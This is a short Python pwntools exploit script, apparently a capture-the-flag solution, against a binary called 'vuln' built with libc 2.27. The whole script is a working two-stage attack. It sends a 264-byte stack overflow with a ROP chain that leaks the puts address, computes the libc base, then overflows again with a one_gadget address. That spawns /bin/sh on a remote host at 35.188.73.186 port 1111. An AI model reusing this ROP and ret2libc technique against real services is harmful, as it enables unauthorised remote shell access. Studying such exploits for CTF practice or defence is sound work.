from pwn import *

libc = ELF('libc-2.27.so')
e = ELF('vuln')

rop = ROP('vuln')
pop_rdi_ret = (rop.find_gadget(['pop rdi', 'ret']))[0]
ret = (rop.find_gadget(['ret']))[0]

p = remote('35.188.73.186', 1111)
# p = process('vuln')

print p.recvuntil('>')

# first stage, print puts address and recursively call main again
p.sendline('A'*264+p64(pop_rdi_ret)+p64(e.got['puts'])+p64(e.symbols['puts'])+p64(e.symbols['main']))
p.recvuntil('\n')
p.recvuntil('\n')
puts = u64(p.recv(6) + '\x00\x00')

print p.recvuntil('>')

# calculate libc base address
libc_base = puts - libc.symbols['puts']
print 'libc_base: ' + hex(libc_base)

# execve /bin/sh found by one_gadget
one_gadget = 0x4f322

# second stage, overflow with one_gadget to spawn a shell
p.sendline('A'*264+p64(ret)+p64(libc_base + one_gadget))
p.interactive()
